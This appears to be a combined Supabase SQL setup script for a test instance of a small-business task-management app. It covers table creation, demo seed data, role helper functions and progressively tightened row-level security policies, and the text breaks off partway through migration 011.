-- Quest HQ — full schema setup for a FRESH test Supabase project.
-- Concatenation of supabase/sql/003..046 in order, EXCLUDING 042 (a
-- production-only jsonb->text[] repair that errors on a fresh DB where
-- company_ids is already text[] from migration 021).
-- Run once in the TEST project's SQL editor. If any single statement errors,
-- the editor stops there — skip past that block and continue, then tell me.

-- ============================================================
-- 003_create_task_management_tables.sql
-- ============================================================
create extension if not exists pgcrypto;

create table if not exists public.companies (
  id text primary key,
  label text not null,
  pill text not null,
  created_at timestamptz not null default now()
);

create table if not exists public.team_members (
  id text primary key,
  name text not null,
  full_name text not null,
  email text not null,
  color text not null,
  created_at timestamptz not null default now()
);

create table if not exists public.tasks (
  id text primary key,
  title text not null,
  description text not null default '',
  company_id text not null references public.companies(id),
  creator_id text not null references public.team_members(id),
  assignee_id text not null references public.team_members(id),
  due date not null,
  priority text not null default 'medium',
  urgency text not null default 'medium',
  status text not null default 'todo',
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now(),
  constraint tasks_priority_check check (priority in ('low', 'medium', 'high', 'urgent')),
  constraint tasks_urgency_check check (urgency in ('critical', 'urgent', 'high', 'medium', 'low', 'chill')),
  constraint tasks_status_check check (status in ('todo', 'pending', 'hold', 'review', 'done'))
);

create table if not exists public.task_watchers (
  task_id text not null references public.tasks(id) on delete cascade,
  member_id text not null references public.team_members(id),
  primary key (task_id, member_id)
);

create table if not exists public.task_subtasks (
  id uuid primary key default gen_random_uuid(),
  task_id text not null references public.tasks(id) on delete cascade,
  body text not null,
  done boolean not null default false,
  sort_order integer not null default 0,
  created_at timestamptz not null default now()
);

create table if not exists public.task_activity (
  id uuid primary key default gen_random_uuid(),
  task_id text not null references public.tasks(id) on delete cascade,
  who text not null,
  what text not null,
  when_label text not null default 'just now',
  created_at timestamptz not null default now()
);

create table if not exists public.time_entries (
  id text primary key,
  user_id text not null references public.team_members(id),
  task_id text not null references public.tasks(id) on delete cascade,
  start_at timestamptz not null,
  end_at timestamptz not null,
  duration_ms bigint not null check (duration_ms >= 0),
  note text not null default '',
  created_at timestamptz not null default now()
);

create table if not exists public.active_timers (
  user_id text primary key references public.team_members(id),
  task_id text not null references public.tasks(id) on delete cascade,
  started_at timestamptz not null,
  updated_at timestamptz not null default now()
);

create table if not exists public.notifications (
  id text primary key,
  member_id text not null references public.team_members(id),
  task_id text references public.tasks(id) on delete cascade,
  meta text not null,
  html text not null,
  read boolean not null default false,
  created_at timestamptz not null default now()
);

create or replace function public.set_updated_at()
returns trigger
language plpgsql
as $$
begin
  new.updated_at = now();
  return new;
end;
$$;

drop trigger if exists set_tasks_updated_at on public.tasks;
create trigger set_tasks_updated_at
before update on public.tasks
for each row execute function public.set_updated_at();

alter table public.companies enable row level security;
alter table public.team_members enable row level security;
alter table public.tasks enable row level security;
alter table public.task_watchers enable row level security;
alter table public.task_subtasks enable row level security;
alter table public.task_activity enable row level security;
alter table public.time_entries enable row level security;
alter table public.active_timers enable row level security;
alter table public.notifications enable row level security;

do $$
declare
  table_name text;
begin
  foreach table_name in array array[
    'companies', 'team_members', 'tasks', 'task_watchers', 'task_subtasks',
    'task_activity', 'time_entries', 'active_timers', 'notifications'
  ] loop
    execute format('drop policy if exists "authenticated can read %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "authenticated can insert %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "authenticated can update %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "authenticated can delete %1$s" on public.%1$I', table_name);

    execute format('create policy "authenticated can read %1$s" on public.%1$I for select to authenticated using (true)', table_name);
    execute format('create policy "authenticated can insert %1$s" on public.%1$I for insert to authenticated with check (true)', table_name);
    execute format('create policy "authenticated can update %1$s" on public.%1$I for update to authenticated using (true) with check (true)', table_name);
    execute format('create policy "authenticated can delete %1$s" on public.%1$I for delete to authenticated using (true)', table_name);
  end loop;
end $$;

insert into public.companies (id, label, pill) values
  ('roofing', 'Roofing', 'pill-roof'),
  ('drafting', 'Drafting', 'pill-draft'),
  ('lumen', 'Lumen', 'pill-lumen')
on conflict (id) do update set label = excluded.label, pill = excluded.pill;

insert into public.team_members (id, name, full_name, email, color) values
  ('abraham', 'Abraham', 'Abraham Maldonado', 'abraham@quest.com', '#E8A03A'),
  ('alkeith', 'Alkeith', 'Alkeith Cabezzas', 'alkeith@questroofing.com', '#993C1D'),
  ('kristine', 'Kristine', 'Kristine', 'kristine@questroofing.com', '#185FA5'),
  ('jesus', 'Jesus', 'Jesus', 'jesus@questroofing.com', '#BA7517'),
  ('andres', 'Andres', 'Andres', 'andres@questdrafting.com', '#3B6D11'),
  ('adrian', 'Adrian', 'Adrian Alegria', 'adrian@lumen.com', '#6E430A')
on conflict (id) do update set
  name = excluded.name,
  full_name = excluded.full_name,
  email = excluded.email,
  color = excluded.color;

create index if not exists tasks_assignee_idx on public.tasks(assignee_id);
create index if not exists tasks_company_idx on public.tasks(company_id);
create index if not exists tasks_due_idx on public.tasks(due);
create index if not exists time_entries_user_idx on public.time_entries(user_id);
create index if not exists time_entries_task_idx on public.time_entries(task_id);
create index if not exists notifications_member_idx on public.notifications(member_id);

-- ============================================================
-- 004_seed_demo_task_data.sql
-- ============================================================
insert into public.tasks (id, title, description, company_id, creator_id, assignee_id, due, priority, urgency, status) values
  ('t1', 'Lien filing - CNL job', 'Mechanic''s lien paperwork prepped. Need to file with Maricopa County recorder before end of week.', 'roofing', 'abraham', 'abraham', current_date - 4, 'high', 'urgent', 'todo'),
  ('t2', 'Update QR ROC complaint draft', 'Add the contract excerpt and email chain as exhibits before sending.', 'roofing', 'abraham', 'kristine', current_date - 2, 'medium', 'high', 'pending'),
  ('t3', 'CNL demand letter follow-up', 'Call CNL accounting by EOD. If no commitment, file mechanic''s lien tomorrow + Justice Court small claims by Friday.', 'roofing', 'abraham', 'abraham', current_date, 'high', 'critical', 'todo'),
  ('t4', 'Paradise Valley demo punch list', 'Final walkthrough items. See photos in shared album.', 'roofing', 'abraham', 'alkeith', current_date, 'high', 'urgent', 'todo'),
  ('t5', 'Jesus week-2 KPI review', 'Review against 90-day vesting milestones. Doors knocked, appts set, contracts signed.', 'roofing', 'abraham', 'abraham', current_date, 'medium', 'high', 'review'),
  ('t6', 'Send Andres weekly QA brief', '', 'drafting', 'abraham', 'abraham', current_date, 'low', 'medium', 'todo'),
  ('t7', 'Adrian - confirm trial milestones', '3-month trial KPIs need to be in writing before next sync.', 'lumen', 'abraham', 'abraham', current_date, 'medium', 'high', 'todo'),
  ('t8', 'Lumen pitch deck v3 sign-off', 'Final review of HVAC pitch deck before client outreach.', 'lumen', 'abraham', 'adrian', current_date + 1, 'medium', 'medium', 'review'),
  ('t9', 'DraftTrack markup tool QA', 'Test all markup tools on Safari + Chrome. Document any issues.', 'drafting', 'abraham', 'andres', current_date + 1, 'medium', 'medium', 'todo'),
  ('t10', 'Schedule monsoon ad shoot', 'Friday morning, blue sky. Confirm location + crew.', 'lumen', 'abraham', 'adrian', current_date + 3, 'medium', 'medium', 'todo'),
  ('t11', 'Supabase auth wiring', 'DraftTrack client portal - add auth + persistent storage.', 'drafting', 'abraham', 'abraham', current_date + 4, 'high', 'high', 'hold'),
  ('t12', 'GC outreach v2 script', 'Hormozi-style warm follow-up. Lead with the ROC + insurance angle.', 'roofing', 'abraham', 'jesus', current_date + 5, 'medium', 'medium', 'todo'),
  ('t13', 'Order shingles, Gilbert job', '', 'roofing', 'abraham', 'kristine', current_date - 1, 'medium', 'medium', 'done'),
  ('t14', 'Send Adrian operating agreement', '', 'lumen', 'abraham', 'abraham', current_date - 2, 'high', 'high', 'done'),
  ('t15', 'Material handoff - Mesa job', 'Voice note from Alkeith: confirm metal flashing arrives at yard by Thursday.', 'roofing', 'alkeith', 'kristine', current_date + 2, 'low', 'chill', 'todo')
on conflict (id) do update set
  title = excluded.title,
  description = excluded.description,
  company_id = excluded.company_id,
  creator_id = excluded.creator_id,
  assignee_id = excluded.assignee_id,
  due = excluded.due,
  priority = excluded.priority,
  urgency = excluded.urgency,
  status = excluded.status;

delete from public.task_watchers where task_id in ('t1','t2','t3','t4','t5','t6','t7','t8','t9','t10','t11','t12','t13','t14','t15');
insert into public.task_watchers (task_id, member_id) values
  ('t1', 'kristine'),
  ('t3', 'kristine'),
  ('t4', 'abraham'),
  ('t5', 'jesus'),
  ('t7', 'adrian'),
  ('t8', 'abraham'),
  ('t12', 'abraham'),
  ('t14', 'adrian'),
  ('t15', 'abraham');

delete from public.task_subtasks where task_id in ('t1','t3','t4');
insert into public.task_subtasks (task_id, body, done, sort_order) values
  ('t1', 'Pull deed info', true, 0),
  ('t1', 'Notarize', false, 1),
  ('t3', 'Send certified letter', true, 0),
  ('t3', 'Call accounting', false, 1),
  ('t3', 'Prep lien paperwork', false, 2),
  ('t4', 'Tear-off west slope', true, 0),
  ('t4', 'Replace decking 2 sheets', true, 1),
  ('t4', 'Drip edge install', false, 2),
  ('t4', 'Final cleanup + photos', false, 3);

delete from public.task_activity where task_id in ('t1','t2','t3','t4','t8','t9','t12','t15');
insert into public.task_activity (task_id, who, what, when_label, created_at) values
  ('t1', 'Abraham', 'created this task', '5d ago', now() - interval '5 days'),
  ('t2', 'Abraham', 'assigned this to Kristine', '3d ago', now() - interval '3 days'),
  ('t3', 'Kristine', 'uploaded letter.pdf', '2h ago', now() - interval '2 hours'),
  ('t3', 'Abraham', 'set due date today', 'yesterday', now() - interval '1 day'),
  ('t4', 'Abraham', 'assigned this to Alkeith', 'yesterday', now() - interval '1 day'),
  ('t8', 'Abraham', 'assigned this to Adrian', '2d ago', now() - interval '2 days'),
  ('t9', 'Abraham', 'assigned this to Andres', '2d ago', now() - interval '2 days'),
  ('t12', 'Abraham', 'assigned this to Jesus', 'today', now()),
  ('t15', 'Alkeith', 'created via voice note', '1h ago', now() - interval '1 hour');

delete from public.time_entries where id in ('e1','e2','e3','e4','e5','e6','e7');
insert into public.time_entries (id, user_id, task_id, start_at, end_at, duration_ms, note) values
  ('e1', 'abraham', 't3', now() - interval '26 hours', now() - interval '24.2 hours', 6480000, 'CNL call prep'),
  ('e2', 'abraham', 't1', now() - interval '50 hours', now() - interval '48.5 hours', 5400000, 'Lien paperwork'),
  ('e3', 'kristine', 't2', now() - interval '28 hours', now() - interval '25 hours', 10800000, 'ROC complaint draft'),
  ('e4', 'alkeith', 't4', now() - interval '8 hours', now() - interval '3.5 hours', 16200000, 'Paradise Valley demo'),
  ('e5', 'andres', 't9', now() - interval '6 hours', now() - interval '3 hours', 10800000, 'Markup QA Safari'),
  ('e6', 'adrian', 't8', now() - interval '30 hours', now() - interval '27.5 hours', 9000000, 'Pitch deck review'),
  ('e7', 'jesus', 't12', now() - interval '4 hours', now() - interval '2.2 hours', 6480000, 'GC outreach draft');

-- ============================================================
-- 005_harden_task_management_rls.sql
-- ============================================================
create or replace function public.set_updated_at()
returns trigger
language plpgsql
set search_path = public, pg_temp
as $$
begin
  new.updated_at = now();
  return new;
end;
$$;

revoke execute on function public.set_updated_at() from anon, authenticated, public;

do $$
begin
  if exists (
    select 1 from pg_proc p
    join pg_namespace n on n.oid = p.pronamespace
    where n.nspname = 'public' and p.proname = 'rls_auto_enable'
  ) then
    revoke execute on function public.rls_auto_enable() from anon, authenticated, public;
  end if;
end $$;

do $$
declare
  table_name text;
  approved_check text := 'exists (select 1 from public.profiles p where p.id = auth.uid() and p.approved is true)';
begin
  foreach table_name in array array[
    'companies', 'team_members', 'tasks', 'task_watchers', 'task_subtasks',
    'task_activity', 'time_entries', 'active_timers', 'notifications'
  ] loop
    execute format('drop policy if exists "authenticated can read %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "authenticated can insert %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "authenticated can update %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "authenticated can delete %1$s" on public.%1$I', table_name);

    execute format('create policy "approved users can read %1$s" on public.%1$I for select to authenticated using (%2$s)', table_name, approved_check);
    execute format('create policy "approved users can insert %1$s" on public.%1$I for insert to authenticated with check (%2$s)', table_name, approved_check);
    execute format('create policy "approved users can update %1$s" on public.%1$I for update to authenticated using (%2$s) with check (%2$s)', table_name, approved_check);
    execute format('create policy "approved users can delete %1$s" on public.%1$I for delete to authenticated using (%2$s)', table_name, approved_check);
  end loop;
end $$;

-- ============================================================
-- 006_add_projects_schedules_and_unverified_profiles.sql
-- ============================================================
create table if not exists public.projects (
  id text primary key,
  company_id text not null references public.companies(id),
  name text not null,
  address text not null default '',
  status text not null default 'active',
  budget numeric(12,2),
  start_date date,
  due_date date,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now(),
  constraint projects_status_check check (status in ('lead', 'active', 'hold', 'complete', 'cancelled'))
);

create table if not exists public.schedules (
  id text primary key,
  title text not null,
  project_id text references public.projects(id) on delete cascade,
  task_id text references public.tasks(id) on delete cascade,
  assigned_to text references public.team_members(id),
  starts_at timestamptz not null,
  ends_at timestamptz,
  recurrence_rule text,
  notes text not null default '',
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

alter table public.tasks add column if not exists project_id text references public.projects(id);
alter table public.tasks add column if not exists subtasks jsonb not null default '[]'::jsonb;
alter table public.tasks add column if not exists activity jsonb not null default '[]'::jsonb;
alter table public.profiles add column if not exists email_verified boolean not null default false;
alter table public.profiles alter column approved set default true;

insert into public.projects (id, company_id, name, address, status, budget, start_date, due_date) values
  ('cnl-job', 'roofing', 'CNL Job', 'Maricopa County, AZ', 'active', null, current_date - 14, current_date + 7),
  ('paradise-valley-demo', 'roofing', 'Paradise Valley Demo', 'Paradise Valley, AZ', 'active', null, current_date - 3, current_date + 2),
  ('mesa-material-handoff', 'roofing', 'Mesa Material Handoff', 'Mesa, AZ', 'active', null, current_date, current_date + 2),
  ('drafttrack-qa', 'drafting', 'DraftTrack QA', '', 'active', null, current_date - 2, current_date + 7),
  ('lumen-ops', 'lumen', 'Lumen Operations', '', 'active', null, current_date - 7, current_date + 14)
on conflict (id) do update set
  company_id = excluded.company_id,
  name = excluded.name,
  address = excluded.address,
  status = excluded.status,
  budget = excluded.budget,
  start_date = excluded.start_date,
  due_date = excluded.due_date;

update public.tasks set project_id = case
  when id in ('t1', 't2', 't3') then 'cnl-job'
  when id = 't4' then 'paradise-valley-demo'
  when id = 't15' then 'mesa-material-handoff'
  when id in ('t6', 't9', 't11') then 'drafttrack-qa'
  when company_id = 'lumen' then 'lumen-ops'
  else project_id
end;

update public.tasks t set subtasks = coalesce((
  select jsonb_agg(jsonb_build_object('t', s.body, 'd', s.done) order by s.sort_order)
  from public.task_subtasks s
  where s.task_id = t.id
), '[]'::jsonb);

update public.tasks t set activity = coalesce((
  select jsonb_agg(jsonb_build_object('who', a.who, 'what', a.what, 'when', a.when_label) order by a.created_at desc)
  from public.task_activity a
  where a.task_id = t.id
), '[]'::jsonb);

insert into public.schedules (id, title, project_id, task_id, assigned_to, starts_at, ends_at, recurrence_rule, notes) values
  ('sched-weekly-qa', 'Weekly QA review', 'drafttrack-qa', 't9', 'andres', date_trunc('day', now()) + interval '9 hours', date_trunc('day', now()) + interval '10 hours', 'FREQ=WEEKLY;INTERVAL=1', 'Recurring QA checkpoint'),
  ('sched-roofing-standup', 'Roofing ops standup', 'cnl-job', null, 'abraham', date_trunc('day', now()) + interval '8 hours', date_trunc('day', now()) + interval '8 hours 30 minutes', 'FREQ=DAILY;INTERVAL=1', 'Daily field update')
on conflict (id) do update set
  title = excluded.title,
  project_id = excluded.project_id,
  task_id = excluded.task_id,
  assigned_to = excluded.assigned_to,
  starts_at = excluded.starts_at,
  ends_at = excluded.ends_at,
  recurrence_rule = excluded.recurrence_rule,
  notes = excluded.notes;

create or replace function public.set_updated_at()
returns trigger
language plpgsql
set search_path = public, pg_temp
as $$
begin
  new.updated_at = now();
  return new;
end;
$$;

drop trigger if exists set_projects_updated_at on public.projects;
create trigger set_projects_updated_at
before update on public.projects
for each row execute function public.set_updated_at();

drop trigger if exists set_schedules_updated_at on public.schedules;
create trigger set_schedules_updated_at
before update on public.schedules
for each row execute function public.set_updated_at();

alter table public.projects enable row level security;
alter table public.schedules enable row level security;

do $$
declare
  table_name text;
  approved_check text := 'exists (select 1 from public.profiles p where p.id = auth.uid() and p.approved is true)';
begin
  foreach table_name in array array['projects', 'schedules'] loop
    execute format('drop policy if exists "approved users can read %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "approved users can insert %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "approved users can update %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "approved users can delete %1$s" on public.%1$I', table_name);
    execute format('create policy "approved users can read %1$s" on public.%1$I for select to authenticated using (%2$s)', table_name, approved_check);
    execute format('create policy "approved users can insert %1$s" on public.%1$I for insert to authenticated with check (%2$s)', table_name, approved_check);
    execute format('create policy "approved users can update %1$s" on public.%1$I for update to authenticated using (%2$s) with check (%2$s)', table_name, approved_check);
    execute format('create policy "approved users can delete %1$s" on public.%1$I for delete to authenticated using (%2$s)', table_name, approved_check);
  end loop;
end $$;

create or replace function public.handle_new_user()
returns trigger
language plpgsql
security definer
set search_path = public, pg_temp
as $$
begin
  insert into public.profiles (id, email, full_name, approved, role, email_verified)
  values (
    new.id,
    new.email,
    coalesce(
      new.raw_user_meta_data ->> 'full_name',
      new.raw_user_meta_data ->> 'name',
      ''
    ),
    true,
    'member',
    false
  )
  on conflict (id) do update set
    email = excluded.email,
    full_name = excluded.full_name,
    approved = true,
    email_verified = coalesce(public.profiles.email_verified, false);
  return new;
end;
$$;

revoke execute on function public.handle_new_user() from anon, authenticated, public;
drop function if exists public.register_unverified_user(text, text, text);

update public.profiles set approved = true where approved is false;

create index if not exists projects_company_idx on public.projects(company_id);
create index if not exists tasks_project_idx on public.tasks(project_id);
create index if not exists schedules_project_idx on public.schedules(project_id);
create index if not exists schedules_task_idx on public.schedules(task_id);
create index if not exists schedules_starts_at_idx on public.schedules(starts_at);

-- ============================================================
-- 007_roles_members_and_access_controls.sql
-- ============================================================
alter table public.profiles add column if not exists member_id text references public.team_members(id);
alter table public.profiles alter column approved set default false;
alter table public.profiles alter column role set default 'member';

create or replace function public.slugify_member_id(input text)
returns text
language sql
immutable
set search_path = public, pg_temp
as $$
  select trim(both '-' from regexp_replace(lower(coalesce(input, 'member')), '[^a-z0-9]+', '-', 'g'));
$$;

with profile_members as (
  select
    p.id,
    coalesce(nullif(public.slugify_member_id(split_part(p.email, '@', 1)), ''), 'member-' || left(p.id::text, 8)) as member_id,
    coalesce(nullif(p.full_name, ''), split_part(p.email, '@', 1), 'Member') as full_name,
    p.email
  from public.profiles p
  where p.member_id is null
)
insert into public.team_members (id, name, full_name, email, color)
select
  pm.member_id,
  split_part(pm.full_name, ' ', 1),
  pm.full_name,
  pm.email,
  '#' || substr(md5(pm.email), 1, 6)
from profile_members pm
on conflict (id) do update set
  name = excluded.name,
  full_name = excluded.full_name,
  email = excluded.email;

with profile_members as (
  select
    p.id,
    coalesce(nullif(public.slugify_member_id(split_part(p.email, '@', 1)), ''), 'member-' || left(p.id::text, 8)) as member_id
  from public.profiles p
  where p.member_id is null
)
update public.profiles p
set member_id = pm.member_id
from profile_members pm
where p.id = pm.id;

-- NOTE: A previous revision of this migration auto-promoted two hardcoded
-- gmail addresses to admin/approved. That was removed during the Phase-4
-- security pass — committing attacker-targetable emails to the migration
-- history is a foothold (anyone who signs up first with that address gets
-- the role applied on next replay, and the addresses leak via the public
-- repo). Bootstrap the first admin manually in the Supabase SQL editor:
--   update public.profiles set role = 'admin', approved = true where id = '<auth-user-uuid>';

insert into public.tasks (id, title, description, company_id, creator_id, assignee_id, due, priority, urgency, status, project_id)
values ('general-shift', 'General shift', 'Clock-in bucket for workers without a specific task assignment.', 'roofing', 'abraham', 'abraham', current_date, 'low', 'low', 'todo', null)
on conflict (id) do update set title = excluded.title, description = excluded.description, status = excluded.status;

create or replace function public.current_profile_role()
returns text
language sql
security definer
set search_path = public, pg_temp
stable
as $$
  -- 'sales' is a worker by another name (migration 048): resolve it to 'worker'
  -- here so every worker RLS branch applies and stale manager `in (...,'sales')`
  -- entries stay inert.
  select case when role_raw = 'sales' then 'worker' else role_raw end
  from (
    select coalesce((select p.role from public.profiles p where p.id = auth.uid()), 'member') as role_raw
  ) t;
$$;

create or replace function public.current_member_id()
returns text
language sql
security definer
set search_path = public, pg_temp
stable
as $$
  select (select p.member_id from public.profiles p where p.id = auth.uid());
$$;

create or replace function public.can_manage_roles()
returns boolean
language sql
security definer
set search_path = public, pg_temp
stable
as $$
  select public.current_profile_role() in ('admin', 'construction_supervisor');
$$;

revoke all on function public.current_profile_role() from public;
revoke all on function public.current_member_id() from public;
revoke all on function public.can_manage_roles() from public;
grant execute on function public.current_profile_role() to authenticated;
grant execute on function public.current_member_id() to authenticated;
grant execute on function public.can_manage_roles() to authenticated;

create or replace function public.handle_new_user()
returns trigger
language plpgsql
security definer
set search_path = public, pg_temp
as $$
declare
  v_member_id text := coalesce(nullif(public.slugify_member_id(split_part(new.email, '@', 1)), ''), 'member-' || left(new.id::text, 8));
  v_full_name text := coalesce(nullif(new.raw_user_meta_data ->> 'full_name', ''), nullif(new.raw_user_meta_data ->> 'name', ''), split_part(new.email, '@', 1));
begin
  insert into public.team_members (id, name, full_name, email, color)
  values (v_member_id, split_part(v_full_name, ' ', 1), v_full_name, new.email, '#' || substr(md5(new.email), 1, 6))
  on conflict (id) do update set
    name = excluded.name,
    full_name = excluded.full_name,
    email = excluded.email;

  insert into public.profiles (id, email, full_name, approved, role, email_verified, member_id)
  values (new.id, new.email, v_full_name, false, 'member', false, v_member_id)
  on conflict (id) do update set
    email = excluded.email,
    full_name = excluded.full_name,
    member_id = excluded.member_id;
  return new;
end;
$$;

revoke execute on function public.handle_new_user() from anon, authenticated, public;

do $$
declare
  table_name text;
  task_check text := 'public.current_profile_role() in (''admin'', ''construction_supervisor'', ''supervisor'', ''sales'')';
  worker_check text := 'public.current_profile_role() in (''admin'', ''construction_supervisor'', ''supervisor'', ''sales'', ''worker'')';
begin
  foreach table_name in array array['companies', 'projects', 'schedules', 'task_watchers', 'task_subtasks', 'task_activity'] loop
    execute format('drop policy if exists "approved users can read %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "approved users can insert %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "approved users can update %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "approved users can delete %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "role users can read %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "role users can insert %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "role users can update %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "role users can delete %1$s" on public.%1$I', table_name);
    execute format('create policy "role users can read %1$s" on public.%1$I for select to authenticated using (%2$s)', table_name, task_check);
    execute format('create policy "role users can insert %1$s" on public.%1$I for insert to authenticated with check (%2$s)', table_name, task_check);
    execute format('create policy "role users can update %1$s" on public.%1$I for update to authenticated using (%2$s) with check (%2$s)', table_name, task_check);
    execute format('create policy "role users can delete %1$s" on public.%1$I for delete to authenticated using (%2$s)', table_name, task_check);
  end loop;

  foreach table_name in array array['time_entries', 'active_timers', 'notifications'] loop
    execute format('drop policy if exists "approved users can read %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "approved users can insert %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "approved users can update %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "approved users can delete %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "role users can read %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "role users can insert %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "role users can update %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "role users can delete %1$s" on public.%1$I', table_name);
    execute format('create policy "role users can read %1$s" on public.%1$I for select to authenticated using (%2$s)', table_name, worker_check);
    execute format('create policy "role users can insert %1$s" on public.%1$I for insert to authenticated with check (%2$s)', table_name, worker_check);
    execute format('create policy "role users can update %1$s" on public.%1$I for update to authenticated using (%2$s) with check (%2$s)', table_name, worker_check);
    execute format('create policy "role users can delete %1$s" on public.%1$I for delete to authenticated using (%2$s)', table_name, worker_check);
  end loop;
end $$;

drop policy if exists "users read own profile" on public.profiles;
drop policy if exists "managers read profiles" on public.profiles;
drop policy if exists "managers update profiles" on public.profiles;
create policy "users read own profile" on public.profiles for select to authenticated using (auth.uid() = id);
create policy "managers read profiles" on public.profiles for select to authenticated using (public.can_manage_roles());
create policy "managers update profiles" on public.profiles for update to authenticated using (public.can_manage_roles()) with check (public.can_manage_roles());

drop policy if exists "approved users can read team_members" on public.team_members;
drop policy if exists "approved users can insert team_members" on public.team_members;
drop policy if exists "approved users can update team_members" on public.team_members;
drop policy if exists "approved users can delete team_members" on public.team_members;
drop policy if exists "role users can read team_members" on public.team_members;
drop policy if exists "managers can insert team_members" on public.team_members;
drop policy if exists "managers can update team_members" on public.team_members;
drop policy if exists "managers can delete team_members" on public.team_members;
create policy "role users can read team_members" on public.team_members
for select to authenticated
using (public.current_profile_role() in ('admin', 'construction_supervisor', 'supervisor', 'sales', 'worker'));
create policy "managers can insert team_members" on public.team_members for insert to authenticated with check (public.can_manage_roles());
create policy "managers can update team_members" on public.team_members for update to authenticated using (public.can_manage_roles()) with check (public.can_manage_roles());
create policy "managers can delete team_members" on public.team_members for delete to authenticated using (public.can_manage_roles());

drop policy if exists "worker can read general shift task" on public.tasks;
create policy "worker can read general shift task" on public.tasks
for select to authenticated
using (public.current_profile_role() = 'worker' and id = 'general-shift');

drop policy if exists "worker can append general shift activity" on public.task_activity;
create policy "worker can append general shift activity" on public.task_activity
for insert to authenticated
with check (public.current_profile_role() = 'worker' and task_id = 'general-shift');

-- ============================================================
-- 008_scope_time_rls_to_current_user.sql
-- ============================================================
drop policy if exists "role users can read time_entries" on public.time_entries;
drop policy if exists "role users can insert time_entries" on public.time_entries;
drop policy if exists "role users can update time_entries" on public.time_entries;
drop policy if exists "role users can delete time_entries" on public.time_entries;
create policy "role users can read time_entries" on public.time_entries
for select to authenticated
using (public.current_profile_role() in ('admin', 'construction_supervisor', 'supervisor', 'sales') or user_id = public.current_member_id());
create policy "role users can insert time_entries" on public.time_entries
for insert to authenticated
with check (user_id = public.current_member_id() or public.current_profile_role() in ('admin', 'construction_supervisor'));
create policy "role users can update time_entries" on public.time_entries
for update to authenticated
using (user_id = public.current_member_id() or public.current_profile_role() in ('admin', 'construction_supervisor'))
with check (user_id = public.current_member_id() or public.current_profile_role() in ('admin', 'construction_supervisor'));
create policy "role users can delete time_entries" on public.time_entries
for delete to authenticated
using (user_id = public.current_member_id() or public.current_profile_role() in ('admin', 'construction_supervisor'));

drop policy if exists "role users can read active_timers" on public.active_timers;
drop policy if exists "role users can insert active_timers" on public.active_timers;
drop policy if exists "role users can update active_timers" on public.active_timers;
drop policy if exists "role users can delete active_timers" on public.active_timers;
create policy "role users can read active_timers" on public.active_timers
for select to authenticated
using (public.current_profile_role() in ('admin', 'construction_supervisor', 'supervisor', 'sales') or user_id = public.current_member_id());
create policy "role users can insert active_timers" on public.active_timers
for insert to authenticated
with check (user_id = public.current_member_id());
create policy "role users can update active_timers" on public.active_timers
for update to authenticated
using (user_id = public.current_member_id()) with check (user_id = public.current_member_id());
create policy "role users can delete active_timers" on public.active_timers
for delete to authenticated
using (user_id = public.current_member_id());

drop policy if exists "role users can read notifications" on public.notifications;
drop policy if exists "role users can insert notifications" on public.notifications;
drop policy if exists "role users can update notifications" on public.notifications;
drop policy if exists "role users can delete notifications" on public.notifications;
create policy "role users can read notifications" on public.notifications
for select to authenticated
using (member_id = public.current_member_id() or public.can_manage_roles());
create policy "role users can insert notifications" on public.notifications
for insert to authenticated
with check (member_id = public.current_member_id() or public.current_profile_role() in ('admin', 'construction_supervisor', 'supervisor', 'sales'));
create policy "role users can update notifications" on public.notifications
for update to authenticated
using (member_id = public.current_member_id() or public.can_manage_roles())
with check (member_id = public.current_member_id() or public.can_manage_roles());
create policy "role users can delete notifications" on public.notifications
for delete to authenticated
using (member_id = public.current_member_id() or public.can_manage_roles());

-- ============================================================
-- 009_drop_unused_clock_tasks.sql
-- ============================================================
drop table if exists public.clock_tasks;

-- ============================================================
-- 010_revoke_role_helpers_from_anon.sql
-- ============================================================
revoke execute on function public.current_profile_role() from anon, public;
revoke execute on function public.current_member_id() from anon, public;
revoke execute on function public.can_manage_roles() from anon, public;

-- ============================================================
-- 011_task_types_developer_role_and_self_serve_names.sql
-- ============================================================
-- 011: Task types & bid status, developer role, self-serve display names
--
-- This migration:
--   1. Adds `type` and `bid_status` columns to tasks so the new Type column persists.
--   2. Adds 'developer' to every RLS role check so developer accounts have admin-level reach.
--   3. Loosens profile/team_member update policies so users can edit their own display name
--      (managers retain full edit access).

------------------------------------------------------------------------
-- 1. Task type + bid status
------------------------------------------------------------------------
alter table public.tasks
  add column if not exists type text not null default 'admin',
  add column if not exists bid_status text;

alter table public.tasks
  drop constraint if exists tasks_type_check;
alter table public.tasks
  add constraint tasks_type_check
  check (type in ('lead', 'bid', 'admin', 'invoicing', 'ar', 'meeting'));

alter table public.tasks
  drop constraint if exists tasks_bid_status_check;
alter table public.tasks
  add constraint tasks_bid_status_check
  check (bid_status is null or bid_status in ('queue', 'started', 'supplier', 'ready'));

------------------------------------------------------------------------
-- 2. Developer role — same powers as admin, plus future debug flags
------------------------------------------------------------------------
create or replace function public.can_manage_roles()
returns boolean
language sql
security definer
set search_path = public, pg_temp
stable
as $$
  select public.current_profile_role() in ('admin', 'construction_supervisor', 'developer');
$$;

revoke all on function public.can_manage_roles() from public;
grant execute on function public.can_manage_roles() to authenticated;

do $$
declare
  table_name text;
